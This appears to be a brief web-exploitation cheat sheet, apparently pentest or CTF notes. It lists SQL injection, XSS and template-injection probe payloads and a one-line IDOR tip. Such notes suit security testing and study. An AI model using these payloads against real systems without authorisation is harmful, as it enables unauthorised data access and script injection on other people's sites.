# Web Exploitation

## SQLi
Payloads:
- ' OR '1'='1
- ' UNION SELECT null, version()--

## XSS
Payloads:
- <script>alert(1)</script>
- < img src=x onerror=alert(1)>

## SSTI
Payloads:
- {{7*7}}
- ${7*7}

## IDOR
Change IDs in URLs, test unauthorized access.
